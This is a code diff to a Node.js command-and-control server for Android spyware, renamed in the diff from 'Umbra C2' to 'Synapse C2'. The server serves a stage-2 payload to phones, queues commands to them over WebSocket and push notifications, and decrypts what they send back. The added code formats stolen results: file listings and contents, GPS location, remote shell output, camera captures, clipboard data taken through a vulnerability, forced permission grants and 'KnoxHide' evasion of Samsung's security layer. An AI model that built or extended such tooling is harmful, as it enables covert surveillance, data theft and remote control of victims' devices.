@@ -32,6 +32,93 @@ function log(level, ...args) {
   }
 }
 
+// ─── Pretty-print typed response ────────────────────────────────────────────
+
+function prettyPrintResponse(deviceId, result) {
+  if (!result || typeof result !== 'object') return;
+
+  const type = result.type || 'unknown';
+  const payload = result.payload || {};
+  const status = result.status || 'ok';
+
+  switch (type) {
+    case 'PingResponse':
+      console.log(`  [PONG] ${payload.latency_ms || 0}ms from ${deviceId}`);
+      break;
+
+    case 'DeviceInfoResponse':
+      console.log(`  [DEVICE] ${payload.brand || '?'} ${payload.model || '?'} (SDK ${payload.sdk}) fingerprint=${(payload.fingerprint || '').substring(0, 40)}...`);
+      break;
+
+    case 'FileListResponse': {
+      const entries = payload.entries || [];
+      const byPath = {};
+      for (const e of entries) {
+        const dir = path.dirname(e.path || '/') || '/';
+        if (!byPath[dir]) byPath[dir] = 0;
+        byPath[dir]++;
+      }
+      const summary = Object.entries(byPath).map(([d, c]) => `${c} from ${d}`).join(', ');
+      console.log(`  [FILES] ${entries.length} entries: ${summary || '(empty)'}`);
+      break;
+    }
+
+    case 'FileReadResponse': {
+      const kb = ((payload.size_bytes || 0) / 1024).toFixed(1);
+      const mime = payload.mime_type || 'application/octet-stream';
+      console.log(`  [FILE_READ] ${payload.file_id} ${mime} (${kb}KB) base64 length=${(payload.base64_data || '').length}`);
+      break;
+    }
+
+    case 'LocationResponse':
+      console.log(`  [LOCATION] ${payload.lat}, ${payload.lng} (±${payload.accuracy || '?'}m) via ${payload.provider || 'unknown'}`);
+      break;
+
+    case 'ShellResponse': {
+      const stdout = (payload.stdout || '').substring(0, 120);
+      const stderr = (payload.stderr || '').substring(0, 80);
+      console.log(`  [SHELL] exit=${payload.exit_code} stdout="${stdout}"${stderr ? ` stderr="${stderr}"` : ''}`);
+      break;
+    }
+
+    case 'CameraResponse': {
+      const kb = ((payload.size_bytes || 0) / 1024).toFixed(0);
+      const dims = payload.width && payload.height ? `${payload.width}x${payload.height}` : '?x?';
+      console.log(`  [CAMERA] ${dims} ${payload.format || 'JPEG'} (${kb}KB)`);
+      break;
+    }
+
+    case 'ClipboardResponse':
+      console.log(`  [CLIPBOARD] ${payload.entry_count || 0} entries via ${payload.provider_type || '?'}${payload.vulnerability ? ' (' + payload.vulnerability + ')' : ''}`);
+      break;
+
+    case 'PermissionGrantResponse':
+      console.log(`  [PERMISSION] ${(payload.granted || []).length}/${(payload.target_permissions || []).length} granted, ${(payload.failed || []).length} failed`);
+      break;
+
+    case 'KnoxHideResponse': {
+      const icon = payload.success ? '✓' : '✗';
+      console.log(`  [KNOX_HIDE] ${icon} technique=${payload.technique || '?'} status=${payload.service_status || '?'} pkg=${payload.target_package || '?'}`);
+      break;
+    }
+
+    case 'ErrorResponse':
+      console.log(`  [ERROR] ${payload.error || result.error || 'unknown'} (module: ${payload.module || '?'})`);
+      break;
+
+    case 'parse_error':
+      console.log(`  [PARSE_ERROR] ${result.error || 'unknown'}`);
+      break;
+
+    default:
+      console.log(`  [${type}] status=${status}`, JSON.stringify(payload).substring(0, 300));
+      break;
+  }
+
+  // Also log raw JSON at debug level
+  log('debug', `Raw response: ${JSON.stringify(result).substring(0, 500)}`);
+}
+
 // ─── TLS ────────────────────────────────────────────────────────────────────
 
 function ensureCerts() {
@@ -39,7 +126,7 @@ function ensureCerts() {
   if (!fs.existsSync(KEY_PATH) || !fs.existsSync(CERT_PATH)) {
     log('info', 'Generating self-signed TLS certificate...');
     execSync(
-      `openssl req -x509 -newkey rsa:4096 -keyout "${KEY_PATH}" -out "${CERT_PATH}" -days 365 -nodes -subj "/CN=umbra-c2"`,
+      `openssl req -x509 -newkey rsa:4096 -keyout "${KEY_PATH}" -out "${CERT_PATH}" -days 365 -nodes -subj "/CN=synapse-c2"`,
       { stdio: 'inherit' }
     );
     log('info', 'TLS certificate generated.');
@@ -50,7 +137,7 @@ function ensureCerts() {
 
 // ─── Device Registry ────────────────────────────────────────────────────────
 
-const devices = new Map(); // device_id → { ws, fcmToken, lastSeen, info, queue[] }
+const devices = new Map();
 
 function getDevice(id) { return devices.get(id); }
 
@@ -104,12 +191,10 @@ app.use((req, res, next) => {
   next();
 });
 
-// Health
 app.get('/api/health', (req, res) => {
   res.json({ status: 'ok', uptime: process.uptime(), devices: devices.size, fcm: fcm.isConfigured() });
 });
 
-// Device list
 app.get('/api/devices', (req, res) => {
   const list = [];
   for (const [id, dev] of devices) {
@@ -124,7 +209,6 @@ app.get('/api/devices', (req, res) => {
   res.json(list);
 });
 
-// Register FCM token
 app.post('/api/register-fcm', (req, res) => {
   const { device_id, fcm_token } = req.body;
   if (!device_id || !fcm_token) return res.status(400).json({ error: 'missing device_id or fcm_token' });
@@ -139,7 +223,6 @@ app.post('/api/register-fcm', (req, res) => {
   res.json({ status: 'ok' });
 });
 
-// Queue command
 app.post('/api/command', (req, res) => {
   const { device_id, module, action, params } = req.body;
   if (!device_id || !module || !action) return res.status(400).json({ error: 'missing fields' });
@@ -147,7 +230,6 @@ app.post('/api/command', (req, res) => {
   res.json({ status: sent ? 'sent' : 'queued_or_offline' });
 });
 
-// Receive result
 app.post('/api/result', (req, res) => {
   const raw = req.body;
   let decrypted = raw;
@@ -155,13 +237,17 @@ app.post('/api/result', (req, res) => {
     if (typeof raw === 'string') decrypted = cryptoModule.decrypt(raw);
     else if (typeof raw === 'object' && raw.p) decrypted = cryptoModule.decrypt(raw.p);
   } catch (e) {
-    // result was plaintext (encryption disabled)
+    // result was plaintext
   }
-  log('info', `Result: ${typeof decrypted === 'string' ? decrypted.substring(0, 200) : JSON.stringify(decrypted).substring(0, 200)}`);
+  try {
+    const parsed = typeof decrypted === 'string' ? JSON.parse(decrypted) : decrypted;
+    prettyPrintResponse(req.body.device_id || '?', parsed);
+  } catch (e) {
+    log('info', `Result: ${typeof decrypted === 'string' ? decrypted.substring(0, 200) : JSON.stringify(decrypted).substring(0, 200)}`);
+  }
   res.json({ status: 'ok' });
 });
 
-// Stage 2 payload
 app.get('/api/stage2', (req, res) => {
   if (fs.existsSync(STAGE2_FILE)) {
     res.setHeader('Content-Type', 'application/octet-stream');
@@ -178,7 +264,6 @@ fcm.init();
 const tlsOptions = { key: fs.readFileSync(KEY_PATH), cert: fs.readFileSync(CERT_PATH) };
 const server = https.createServer(tlsOptions, app);
 
-// Raw WebSocket at /c2 (not Socket.IO — our Android client uses plain WS)
 const wss = new WebSocketServer({ server, path: '/c2' });
 
 wss.on('connection', (ws, req) => {
@@ -207,12 +292,12 @@ wss.on('connection', (ws, req) => {
     if (deviceId) {
       try {
         const decrypted = cryptoModule.decrypt(rawStr);
-        log('info', `Result from ${deviceId}: ${decrypted.substring(0, 200)}`);
         try {
           const result = JSON.parse(decrypted);
-          console.log('[RESULT]', JSON.stringify(result, null, 2));
+          prettyPrintResponse(deviceId, result);
         } catch (e) {
-          console.log('[RESULT]', decrypted);
+          // Not valid JSON — log raw
+          log('info', `Result from ${deviceId}: ${decrypted.substring(0, 200)}`);
         }
       } catch (e) {
         log('warn', `Decrypt failed from ${deviceId}: ${e.message}`);
@@ -237,7 +322,7 @@ server.listen(PORT, () => {
   const stageOk = fs.existsSync(STAGE2_FILE);
   console.log();
   console.log('╔════════════════════════════════════════════════════════╗');
-  console.log('║              Umbra C2 Server                          ║');
+  console.log('║              Synapse C2 Server                        ║');
   console.log('╠════════════════════════════════════════════════════════╣');
   console.log(`║  HTTPS      : https://0.0.0.0:${PORT}                  ║`);
   console.log(`║  WebSocket  : wss://0.0.0.0:${PORT}/c2                ║`);
@@ -247,7 +332,6 @@ server.listen(PORT, () => {
   console.log();
 });
 
-// Graceful shutdown
 process.on('SIGINT', shutdown);
 process.on('SIGTERM', shutdown);
 
